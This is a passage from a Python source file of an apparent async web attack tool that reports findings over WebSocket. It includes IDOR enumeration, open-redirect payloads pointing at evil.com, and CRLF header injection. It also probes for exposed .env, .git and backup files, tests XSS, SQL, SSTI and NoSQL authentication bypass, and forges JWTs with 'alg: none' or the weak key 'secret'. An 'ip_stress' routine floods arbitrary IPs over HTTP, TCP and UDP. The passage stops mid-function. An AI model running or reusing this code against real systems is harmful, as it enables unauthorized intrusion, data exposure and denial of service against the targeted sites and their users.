                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        })
                        await manager.broadcast(json.dumps({
                            'type': 'log',
                            'message': '[XXE] External entity resolution verified — file disclosure detected',
                            'level': 'error'
                        }))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def idor_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Increment numeric IDs in query params to test for IDOR."""
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        for base_id in range(1, 200):
            if time.time() - start_time >= duration or not metrics['attacks_running']:
                break
            # Use honeypot's dedicated /api/users/<id> IDOR endpoint
            base_url_idor = url.rstrip('/')
            test_url = f"{base_url_idor}/api/users/{base_id}"
            t0 = time.time()
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    if resp.status == 200:
                        body = await resp.text()
                        await record_request_metric(True, elapsed, resp.status)
                        vuln = {
                            'type': 'IDOR (Insecure Direct Object Reference)',
                            'url': test_url,
                            'payload': f'user_id={base_id}',
                            'severity': 'High',
                            'evidence': body[:180],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        }
                        if await record_vulnerability(vuln):
                            await manager.broadcast(json.dumps({'type': 'vulnerability', 'data': vuln}))
                        await manager.broadcast(json.dumps({'type': 'log', 'message': f'[IDOR] 200 OK → /api/users/{base_id} — unauthenticated record exposed', 'level': 'warning'}))
                    elif resp.status in [401, 403]:
                        await record_request_metric(False, elapsed, resp.status)
                    else:
                        await record_request_metric(True, elapsed, resp.status)
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def open_redirect_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    redirect_payloads = [
        '//evil.com', '//evil.com/phish', 'https://evil.com',
        '//evil.com%2F@trusted.com', '/\\evil.com', '/%2F%2Fevil.com',
        'https:evil.com', '//evil%E3%80%82com', '//google.com',
        '///evil.com', '/redirect?url=https://evil.com'
    ]
    params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'goto', 'dest', 'destination', 'ref', 'r', 'continue', 'forward']
    start_time = time.time()
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = random.choice(redirect_payloads)
            base = url.rstrip('/')
            test_url = f"{base}/redirect?url={payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    await record_request_metric(True, elapsed, resp.status)
                    location = resp.headers.get('Location', '')
                    if resp.status in [301,302,303,307,308] and 'evil.com' in location:
                        vuln = {'type': 'Open Redirect', 'url': test_url, 'payload': payload, 'severity': 'Medium', 'evidence': f'Location: {location}'}
                        if await record_vulnerability(vuln):
                            await manager.broadcast(json.dumps({'type':'vulnerability','data':vuln}))
                            await manager.broadcast(json.dumps({'type':'log','message':f'[Redirect] VULNERABLE → redirects to {location}','level':'error'}))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


async def header_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str, custom_payload: Optional[str] = None):
    import urllib.parse
    crlf_payloads = [
        '%0d%0aSet-Cookie:%20injected=value',
        '%0d%0aLocation:%20https://evil.com',
        '%0aX-Injected:%20header',
        '%0d%0aSet-Cookie:%20session=hacked',
        '%0d%0aX-Forwarded-For:%20127.0.0.1',
        '%0d%0aContent-Length:%200',
    ]
    custom_tokens: List[str] = []
    if custom_payload:
        clean_custom = custom_payload.replace('\r\n', '\n').replace('\r', '\n')
        custom_encoded_list = []
        for line in clean_custom.split('\n'):
            stripped = line.strip()
            if stripped:
                custom_tokens.append(stripped.lower())
                custom_encoded_list.append('%0d%0a' + urllib.parse.quote(stripped, safe=':=;-_/.'))
        if custom_encoded_list:
            crlf_payloads = custom_encoded_list + crlf_payloads

    start_time = time.time()
    idx = 0
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        while time.time() - start_time < duration and metrics['attacks_running']:
            payload = crlf_payloads[idx % len(crlf_payloads)]
            idx += 1
            base = url.rstrip('/')
            test_url = f"{base}/api/set-lang?lang=en{payload}"
            t0 = time.time()
            try:
                async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    elapsed = time.time() - t0
                    await record_request_metric(True, elapsed, resp.status)
                    resp_headers_str = str(dict(resp.headers))
                    resp_headers_lower = resp_headers_str.lower()
                    matched_custom = any(tok in resp_headers_lower for tok in custom_tokens)
                    if 'injected' in resp_headers_lower or 'hacked' in resp_headers_lower or matched_custom:
                        decoded_payload = urllib.parse.unquote(payload).replace('\r\n', '\\r\\n').replace('\n', '\\n')
                        vuln = {
                            'type': 'HTTP Header Injection / CRLF',
                            'url': test_url,
                            'payload': decoded_payload,
                            'severity': 'High',
                            'evidence': resp_headers_str[:240],
                            'timestamp': datetime.now().isoformat(),
                            'attack_id': attack_id
                        }
                        if await record_vulnerability(vuln):
                            await manager.broadcast(json.dumps({'type': 'vulnerability', 'data': vuln}))
                            await manager.broadcast(json.dumps({'type': 'log', 'message': f'[Header Injection] Reflected in response headers: {decoded_payload}', 'level': 'warning'}))
            except Exception:
                await record_request_metric(False)
            await asyncio.sleep(1.0 / max(intensity, 1))


# ══════════════════════════════════════════════════════════════════════
#  REAL TARGET AUDIT  — runs before every attack, reports real findings
# ══════════════════════════════════════════════════════════════════════

async def _broadcast_finding(vuln: dict):
    """Store finding and broadcast to all connected clients."""
    if await record_vulnerability(vuln):
        await manager.broadcast(json.dumps({"type": "vulnerability", "data": vuln}))


def format_url(target: str) -> str:
    if target.startswith("http"):
        return target
    if "localhost" in target or "127.0.0.1" in target or re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target):
        return f"http://{target}"
    return f"https://{target}"

async def target_audit(url: str, attack_id: str):
    """
    Pre-attack passive security audit. Sends real findings via WebSocket.
    Checks: security headers, CORS, info disclosure, clickjacking, admin panels,
    sensitive files, cookie flags, dangerous HTTP methods, TLS, error leakage.
    """
    base_url = format_url(url)
    host = re.sub(r'^https?://', '', base_url).split('/')[0].split(':')[0]
    ts = datetime.now().isoformat()

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Audit] Running pre-attack recon on {host}...",
        "level": "info"
    }))

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:

            # ── 1. Fetch base response ──────────────────────────────
            try:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=10),
                                       allow_redirects=True,
                                       headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}) as resp:
                    headers = {k.lower(): v for k, v in resp.headers.items()}
                    body_raw = await resp.read()
                    body = body_raw[:8000].decode("utf-8", errors="replace").lower()
                    status = resp.status
            except Exception as e:
                await manager.broadcast(json.dumps({
                    "type": "log", "message": f"[Audit] Could not reach {host}: {e}", "level": "warning"
                }))
                return

            # ── 2. Security Headers ─────────────────────────────────
            missing_hdr = []
            sec_headers = {
                "strict-transport-security": ("HSTS Missing", "high",
                    "HSTS not set — browser can be downgraded from HTTPS to HTTP (MITM risk)"),
                "content-security-policy": ("No Content Security Policy", "high",
                    "CSP absent — XSS attacks have no browser-level mitigation"),
                "x-frame-options": ("Clickjacking Possible", "medium",
                    "X-Frame-Options missing — page can be embedded in <iframe> for clickjacking"),
                "x-content-type-options": ("MIME Sniffing Allowed", "medium",
                    "X-Content-Type-Options missing — browser may sniff content type (MIME confusion)"),
                "referrer-policy": ("Referrer Leakage", "low",
                    "Referrer-Policy not set — full URL may be leaked to third-party origins"),
                "permissions-policy": ("Permissions Policy Absent", "low",
                    "Permissions-Policy missing — browser features (camera, mic) unrestricted"),
            }
            for hdr, (vuln_type, severity, detail) in sec_headers.items():
                if hdr not in headers:
                    missing_hdr.append(hdr)
                    await _broadcast_finding({
                        "type": vuln_type, "severity": severity,
                        "url": base_url, "detail": detail,
                        "evidence": f"Header '{hdr}' absent from response",
                        "timestamp": ts, "attack_id": attack_id, "category": "headers"
                    })

            # ── 3. Server / Technology Disclosure ──────────────────
            for h in ("server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"):
                val = headers.get(h)
                if val and len(val) > 0:
                    await _broadcast_finding({
                        "type": "Server Information Disclosure", "severity": "medium",
                        "url": base_url,
                        "detail": f"Response exposes server tech: {h}: {val}",
                        "evidence": f"{h}: {val}",
                        "timestamp": ts, "attack_id": attack_id, "category": "disclosure"
                    })

            # ── 4. CORS Misconfiguration ────────────────────────────
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            if acao == "*":
                await _broadcast_finding({
                    "type": "CORS Wildcard Origin", "severity": "medium",
                    "url": base_url,
                    "detail": "Access-Control-Allow-Origin: * allows any origin to read responses",
                    "evidence": f"ACAO: {acao}",
                    "timestamp": ts, "attack_id": attack_id, "category": "cors"
                })
            if acao == "*" and "true" in acac.lower():
                await _broadcast_finding({
                    "type": "CORS Wildcard + Credentials", "severity": "critical",
                    "url": base_url,
                    "detail": "ACAO: * with Allow-Credentials: true is an invalid but dangerous CORS config",
                    "evidence": f"ACAO: {acao} | ACAC: {acac}",
                    "timestamp": ts, "attack_id": attack_id, "category": "cors"
                })

            # ── 5. Cookie Security Flags ────────────────────────────
            set_cookie = headers.get("set-cookie", "")
            if set_cookie:
                flags = set_cookie.lower()
                if "httponly" not in flags:
                    await _broadcast_finding({
                        "type": "Cookie Missing HttpOnly Flag", "severity": "medium",
                        "url": base_url,
                        "detail": "Session cookie lacks HttpOnly — accessible via document.cookie (XSS risk)",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })
                if "secure" not in flags and "https" in base_url:
                    await _broadcast_finding({
                        "type": "Cookie Missing Secure Flag", "severity": "medium",
                        "url": base_url,
                        "detail": "Cookie lacks Secure flag — may be sent over HTTP connections",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })
                if "samesite" not in flags:
                    await _broadcast_finding({
                        "type": "Cookie Missing SameSite Flag", "severity": "low",
                        "url": base_url,
                        "detail": "Cookie lacks SameSite attribute — CSRF risk for state-changing requests",
                        "evidence": set_cookie[:120],
                        "timestamp": ts, "attack_id": attack_id, "category": "cookies"
                    })

            # ── 6. Dangerous HTTP Methods ───────────────────────────
            for method in ("TRACE", "PUT", "DELETE", "CONNECT"):
                try:
                    async with session.request(method, base_url,
                                               timeout=aiohttp.ClientTimeout(total=5)) as r:
                        if r.status not in (405, 501, 403, 400, 404):
                            await _broadcast_finding({
                                "type": f"Dangerous HTTP Method Allowed: {method}", "severity": "high",
                                "url": base_url,
                                "detail": f"Server accepted {method} request (status {r.status}) — may allow data manipulation or XST",
                                "evidence": f"HTTP {method} → {r.status}",
                                "timestamp": ts, "attack_id": attack_id, "category": "methods"
                            })
                except Exception:
                    pass

            # ── 7. Error / Info Leakage ─────────────────────────────
            error_probes = [
                (f"{base_url}/.git/HEAD", "Git Repository Exposed", "critical",
                 ".git/HEAD is publicly accessible — source code may be dumpable"),
                (f"{base_url}/.env", "Environment File Exposed", "critical",
                 ".env file accessible — may contain DB passwords, API keys, secrets"),
                (f"{base_url}/config.json", "Config File Exposed", "critical",
                 "config.json publicly accessible — may expose credentials or API keys"),
                (f"{base_url}/phpinfo.php", "PHP Info Page Exposed", "high",
                 "phpinfo() page accessible — exposes server config, paths, PHP version"),
                (f"{base_url}/admin", "Admin Panel Exposed", "high",
                 "Admin panel accessible without authentication check"),
                (f"{base_url}/wp-admin", "WordPress Admin Exposed", "high",
                 "WordPress admin login page accessible"),
                (f"{base_url}/server-status", "Apache Server Status Exposed", "high",
                 "Apache mod_status exposed — reveals active connections and server load"),
                (f"{base_url}/robots.txt", "Robots.txt Reveals Hidden Paths", "low",
                 "robots.txt found — may disclose sensitive directory paths"),
                (f"{base_url}/sitemap.xml", "Sitemap Exposed", "info",
                 "sitemap.xml found — reveals all indexed URLs"),
                (f"{base_url}/backup.zip", "Backup File Exposed", "critical",
                 "backup.zip accessible — may contain full application source or DB dump"),
                (f"{base_url}/api/v1/users", "API Users Endpoint Exposed", "high",
                 "Unauthenticated access to /api/v1/users — potential IDOR / data leak"),
                (f"{base_url}/swagger", "Swagger UI Exposed", "medium",
                 "Swagger/OpenAPI docs public — reveals all API endpoints and schemas"),
                (f"{base_url}/graphql", "GraphQL Endpoint Exposed", "medium",
                 "GraphQL endpoint public — introspection may reveal full schema"),
            ]

            for probe_url, vuln_type, severity, detail in error_probes:
                if not metrics["attacks_running"] and attack_id != "audit_only":
                    break
                try:
                    async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=5),
                                           allow_redirects=False) as pr:
                        if pr.status in (200, 206):
                            probe_body = (await pr.read())[:500].decode("utf-8", errors="replace")
                            # Filter false positives — check body has real content
                            if len(probe_body.strip()) > 20:
                                await _broadcast_finding({
                                    "type": vuln_type, "severity": severity,
                                    "url": probe_url, "detail": detail,
                                    "evidence": f"HTTP 200 — {probe_body[:120].strip()}",
                                    "timestamp": ts, "attack_id": attack_id, "category": "exposure"
                                })
                except Exception:
                    pass

            # ── 8. XSS Reflection Quick Check ──────────────────────
            xss_probe = "<script>alert(1)</script>"
            try:
                async with session.get(
                    f"{base_url}?q={xss_probe}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as xr:
                    xr_body = (await xr.read())[:4000].decode("utf-8", errors="replace")
                    if xss_probe in xr_body or "alert(1)" in xr_body:
                        await _broadcast_finding({
                            "type": "Reflected XSS Confirmed", "severity": "critical",
                            "url": base_url,
                            "detail": "XSS payload reflected unescaped in response — script execution possible",
                            "payload": xss_probe,
                            "evidence": "Payload found verbatim in response body",
                            "timestamp": ts, "attack_id": attack_id, "category": "xss"
                        })
            except Exception:
                pass

            # ── 9. SQL Error Detection ──────────────────────────────
            sql_probe = "'"
            try:
                async with session.get(
                    f"{base_url}?id={sql_probe}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as sr:
                    sr_body = (await sr.read())[:4000].decode("utf-8", errors="replace").lower()
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "odbc driver", "sqlite",
                                  "pg_query", "unclosed quotation", "unterminated quoted string",
                                  "you have an error in your sql", "warning: mysql"]
                    for err in sql_errors:
                        if err in sr_body:
                            await _broadcast_finding({
                                "type": "SQL Injection Error Detected", "severity": "critical",
                                "url": base_url,
                                "detail": f"SQL error leaked in response to quote injection: '{err}' found in body",
                                "payload": sql_probe,
                                "evidence": sr_body[max(0, sr_body.index(err)-30):sr_body.index(err)+80],
                                "timestamp": ts, "attack_id": attack_id, "category": "sqli"
                            })
                            break
            except Exception:
                pass

            # ── 10. Open Redirect Check ─────────────────────────────
            redirect_probe = "https://evil.com"
            for param in ("url", "redirect", "next", "return", "goto", "redir"):
                try:
                    async with session.get(
                        f"{base_url}?{param}={redirect_probe}",
                        timeout=aiohttp.ClientTimeout(total=5),
                        allow_redirects=False
                    ) as rr:
                        loc = rr.headers.get("Location", "")
                        if "evil.com" in loc:
                            await _broadcast_finding({
                                "type": "Open Redirect Confirmed", "severity": "high",
                                "url": base_url,
                                "detail": f"Parameter '{param}' redirects to attacker-controlled URL",
                                "payload": f"?{param}={redirect_probe}",
                                "evidence": f"Location: {loc}",
                                "timestamp": ts, "attack_id": attack_id, "category": "redirect"
                            })
                            break
                except Exception:
                    pass

    except Exception as e:
        await manager.broadcast(json.dumps({
            "type": "log", "message": f"[Audit] Error during audit: {str(e)}", "level": "warning"
        }))

    n = len([v for v in metrics["vulnerabilities_found"] if v.get("attack_id") == attack_id])
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Audit] Complete — {n} finding(s) identified on {host}",
        "level": "success" if n == 0 else "warning"
    }))


async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int, protocol: str, attack_id: str):
    """Multi-protocol transport reachability & load verification against an IP or host:port."""
    raw_target = re.sub(r'^https?://', '', ip.strip()).split('/')[0]
    if ':' in raw_target and raw_target.split(':')[-1].isdigit():
        clean_ip = raw_target.rsplit(':', 1)[0]
        explicit_port = int(raw_target.rsplit(':', 1)[1])
    else:
        clean_ip = raw_target
        explicit_port = None

    FLOOD_PORTS = [explicit_port] if explicit_port else [80, 443, 8080, 8083, 8443]
    SCAN_PORTS  = [explicit_port] if explicit_port else [22, 21, 25, 53, 3306, 5432]
    HTTP_PORTS  = [explicit_port] if explicit_port else [80, 8080, 8083]
    start_time  = time.time()
    sent        = 0

    # ── Phase 1: HTTP transport verification ──
    async def http_flood():
        nonlocal sent
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            while time.time() - start_time < duration and metrics["attacks_running"]:
                for port in HTTP_PORTS:
                    if not metrics["attacks_running"]:
                        break
                    scheme = "https" if port in (443, 8443) else "http"
                    ip_str = f"[{clean_ip}]" if ":" in clean_ip else clean_ip
                    target_url = f"{scheme}://{ip_str}:{port}/"
                    req_start = time.time()
                    try:
                        headers = {"User-Agent": random.choice(ua_list), "X-CyberStrike-Module": "ip_stress"}
                        async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=1.5)) as resp:
                            req_time = time.time() - req_start
                            await record_request_metric(True, req_time, resp.status)
                            sent += 1
                            await _broadcast_finding({
                                "type": f"Unthrottled HTTP Transport Port ({port}/tcp)",
                                "severity": "Low",
                                "url": f"{clean_ip}:{port}",
                                "payload": f"HTTP GET {target_url}",
                                "detail": f"Endpoint {clean_ip}:{port} accepted rapid HTTP load probes ({req_time*1000:.1f} ms) without rate-limiting.",
                                "evidence": f"HTTP {resp.status} on {clean_ip}:{port} | RTT: {req_time*1000:.1f} ms",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                    except Exception:
                        await record_request_metric(False)
                        sent += 1
                await asyncio.sleep(1.0 / max(intensity, 1))

    # ── Phase 2: Raw TCP socket verification ──
    async def tcp_flood():
        nonlocal sent
        while time.time() - start_time < duration and metrics["attacks_running"]:
            port = random.choice(FLOOD_PORTS + SCAN_PORTS)
            req_start = time.time()
            try:
                reader, writer = await asyncio.wait_for(asyncio.open_connection(clean_ip, port), timeout=1.0)
                writer.write(b"HEAD / HTTP/1.1\r\nHost: " + clean_ip.encode() + b"\r\nX-CyberStrike-Module: ip_stress\r\n\r\n")
                await asyncio.wait_for(writer.drain(), timeout=0.8)
                req_time = time.time() - req_start
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                await record_request_metric(True, req_time, 200)
                sent += 1
                await _broadcast_finding({
                    "type": f"Open TCP Transport Socket ({port}/tcp)",
                    "severity": "Medium",
                    "url": f"{clean_ip}:{port}",
                    "payload": f"TCP Handshake Probe -> {clean_ip}:{port}",
                    "detail": f"TCP socket handshake succeeded on {clean_ip}:{port} with {req_time*1000:.1f} ms latency.",
                    "evidence": f"TCP {clean_ip}:{port} CONNECTED ({req_time*1000:.1f} ms)",
                    "timestamp": datetime.now().isoformat(),
                    "attack_id": attack_id
                })
            except Exception:
                await record_request_metric(False)
                sent += 1
            await asyncio.sleep(0.1)

    # ── Phase 3: UDP datagram probe ──
    async def udp_flood():
        nonlocal sent
        payload = random.randbytes(256)
        while time.time() - start_time < duration and metrics["attacks_running"]:
            port = random.choice(FLOOD_PORTS + SCAN_PORTS)
            t0 = time.time()
            try:
                loop = asyncio.get_event_loop()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                await loop.sock_sendto(sock, payload, (clean_ip, port))
                sock.close()
                await record_request_metric(True, time.time() - t0, 200)
                sent += 1
            except Exception:
                await record_request_metric(False)
                sent += 1
            await asyncio.sleep(0.08)

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[IP Stress] Launching {min(threads, 15)} transport workers against {clean_ip} for {duration}s",
        "level": "warning"
    }))

    tasks = []
    for _ in range(min(max(threads, 1), 15)):
        tasks.append(asyncio.create_task(http_flood()))
        if protocol in ("tcp", "both"):
            tasks.append(asyncio.create_task(tcp_flood()))
        if protocol in ("udp", "both"):
            tasks.append(asyncio.create_task(udp_flood()))
    await asyncio.gather(*tasks)

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[IP Stress] Diagnostic complete — {sent} total probes dispatched to {clean_ip}",
        "level": "success"
    }))


async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_id: str):
    """Multi-pass OSINT probe against a phone number — carrier, geo, validity, timezone."""
    phone = phone.strip()
    if not phone.startswith("+") and phone.replace("-", "").replace(" ", "").isdigit():
        phone = "+" + phone.replace("-", "").replace(" ", "")

    start_time = time.time()
    pass_num = 0

    while time.time() - start_time < duration and metrics["attacks_running"]:
        pass_num += 1
        req_start = time.time()
        results = {"pass": pass_num, "target": phone, "valid": False}
        try:
            parsed = phonenumbers.parse(phone, None)
            results["valid"] = phonenumbers.is_valid_number(parsed)
            results["possible"] = phonenumbers.is_possible_number(parsed)
            results["country_code"] = parsed.country_code
            results["national_number"] = str(parsed.national_number)
            results["location"] = geocoder.description_for_number(parsed, "en")
            results["carrier"] = carrier.name_for_number(parsed, "en")
            results["timezones"] = list(timezone.time_zones_for_number(parsed))
            req_time = time.time() - req_start
            await record_request_metric(True, req_time, 200)

            if pass_num == 1:
                await _broadcast_finding({
                    "type": "Phone Number OSINT Enumeration",
                    "severity": "Info",
                    "url": phone,
                    "payload": f"E.164 ITU-T Metadata Lookup ({phone})",
                    "detail": (
                        f"Valid={results['valid']} | Country=+{results['country_code']} | "
                        f"Region={results['location'] or 'N/A'} | Carrier={results['carrier'] or 'Unknown'}"
                    ),
                    "evidence": f"Timezones: {', '.join(results['timezones']) or 'N/A'} | National: {results['national_number']}",
                    "timestamp": datetime.now().isoformat(),
                    "attack_id": attack_id
                })

            await manager.broadcast(json.dumps({
                "type": "log",
                "message": (
                    f"[Phone Probe #{pass_num}] {phone} | Valid={results['valid']} | "
                    f"Country=+{results['country_code']} | Location={results['location'] or 'N/A'} | "
                    f"Carrier={results['carrier'] or 'Unknown'} | TZ={', '.join(results['timezones'])}"
                ),
                "level": "success" if results["valid"] else "warning"
            }))
        except Exception as e:
            await record_request_metric(False)
            await manager.broadcast(json.dumps({
                "type": "log",
                "message": f"[Phone Probe #{pass_num}] Parse error: {str(e)}",
                "level": "error"
            }))
        await asyncio.sleep(1.0 / max(intensity, 1))


async def ssti_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Server-Side Template Injection (SSTI) multi-worker concurrent arithmetic canary verification."""
    import urllib.parse
    base = format_url(url).rstrip('/')
    canaries = [
        ("{{7*719}}", "5033", "Jinja2 / Twig / Nunjucks"),
        ("${7*719}", "5033", "Freemarker / Velocity / EL"),
        ("<%= 7*719 %>", "5033", "ERB / EJS"),
        ("#{7*719}", "5033", "Pug / Slim / Ruby"),
        ("{{7*'7'}}", "7777777", "Jinja2 String Multiplication")
    ]
    endpoints = [
        f"{base}/api/render?template=",
        f"{base}/search?q=",
        f"{base}/?name=",
        f"{base}/?template=",
        f"{base}/?view="
    ]
    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        baseline_text = ""
        try:
            async with session.get(base, headers={"X-CyberStrike-Baseline": "true"}, timeout=aiohttp.ClientTimeout(total=4)) as b_resp:
                baseline_text = await b_resp.text()
        except Exception:
            pass

        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                expr, expected, engine = canaries[idx % len(canaries)]
                ep_prefix = endpoints[(idx // len(canaries)) % len(endpoints)]
                idx += 1
                test_url = f"{ep_prefix}{urllib.parse.quote(expr)}"
                t0 = time.time()
                try:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        if expected in body and expected not in baseline_text:
                            await _broadcast_finding({
                                "type": f"Server-Side Template Injection ({engine})",
                                "severity": "Critical",
                                "url": test_url,
                                "payload": expr,
                                "detail": f"Template expression '{expr}' was evaluated server-side to '{expected}', confirming {engine} template injection.",
                                "evidence": f"HTTP {resp.status} — Evaluated output '{expected}' found in response body",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                            await manager.broadcast(json.dumps({
                                "type": "log",
                                "message": f"[SSTI] Evaluated {expr} -> {expected} ({engine}) at {test_url}",
                                "level": "error"
                            }))
                except Exception:
                    await record_request_metric(False)
                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def nosql_injection_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """NoSQL Operator ($ne, $gt, $regex) multi-worker concurrent Filter Injection Auditor."""
    base = format_url(url).rstrip('/')
    json_payloads = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": "admin", "password": {"$ne": "invalid_canary_991"}},
        {"username": {"$regex": "^adm"}, "password": {"$ne": None}},
    ]
    query_probes = [
        f"{base}/api/users?id[$ne]=0",
        f"{base}/api/products?id[$gt]=0",
        f"{base}/login?username[$ne]=null&password[$ne]=null",
    ]
    post_endpoints = [f"{base}/api/nosql/login", f"{base}/api/login", f"{base}/login"]
    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                payload = json_payloads[idx % len(json_payloads)]
                post_ep = post_endpoints[idx % len(post_endpoints)]
                q_ep    = query_probes[idx % len(query_probes)]
                idx += 1

                t0 = time.time()
                try:
                    async with session.post(
                        post_ep,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        body_lower = body.lower()
                        if resp.status == 200 and any(k in body_lower for k in ("authenticated", "token", "superuser", "welcome")):
                            await _broadcast_finding({
                                "type": "NoSQL Operator Authentication Bypass",
                                "severity": "Critical",
                                "url": post_ep,
                                "payload": json.dumps(payload),
                                "detail": "Authentication endpoint accepted MongoDB/NoSQL comparison operators ($ne / $gt) in JSON body without type sanitization.",
                                "evidence": f"HTTP 200 | Response: {body[:160]}",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                        elif any(err in body_lower for err in ("mongoerror", "casterror", "$where", "bson", "couchdb")):
                            await _broadcast_finding({
                                "type": "NoSQL Error / Query Structure Leakage",
                                "severity": "High",
                                "url": post_ep,
                                "payload": json.dumps(payload),
                                "detail": "Database driver leaked internal NoSQL parser/operator exception details.",
                                "evidence": body[:160],
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                t1 = time.time()
                try:
                    async with session.get(q_ep, timeout=aiohttp.ClientTimeout(total=5)) as q_resp:
                        q_body = await q_resp.text()
                        await record_request_metric(q_resp.status < 500, time.time() - t1, q_resp.status)
                        if any(err in q_body.lower() for err in ("mongoerror", "casterror", "bson")):
                            await _broadcast_finding({
                                "type": "NoSQL Query Parameter Operator Injection",
                                "severity": "High",
                                "url": q_ep,
                                "payload": q_ep.split("?", 1)[-1],
                                "detail": "Query parameter array/object notation triggered a NoSQL driver error.",
                                "evidence": q_body[:160],
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def jwt_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """JWT Signature Verification ('alg: none', Tampered Signature, Weak HMAC Key) Multi-Worker Auditor."""
    import base64
    import hmac
    import hashlib

    def _b64u(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    hdr_none = _b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    hdr_hs256 = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    claims = _b64u(json.dumps({"sub": "admin", "role": "admin", "iat": int(time.time())}).encode())

    tok_none = f"{hdr_none}.{claims}."
    tok_tampered = f"{hdr_hs256}.{claims}.tampered_signature_canary_00"
    sig_weak = _b64u(hmac.new(b"secret", f"{hdr_hs256}.{claims}".encode(), hashlib.sha256).digest())
    tok_weak = f"{hdr_hs256}.{claims}.{sig_weak}"

    probes = [
        ("alg:none Unsigned Token", tok_none, "Critical", "Endpoint accepted an unsigned JWT with header 'alg: none'."),
        ("Unverified Signature Token", tok_tampered, "Critical", "Endpoint decoded JWT claims without verifying the cryptographic signature."),
        ("Weak HMAC Secret ('secret')", tok_weak, "High", "Endpoint accepted a JWT signed with the default weak HMAC secret 'secret'."),
    ]
    base = format_url(url).rstrip('/')
    endpoints = [f"{base}/api/auth/verify", f"{base}/api/profile", f"{base}/api/me", f"{base}/api/users/1"]

    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
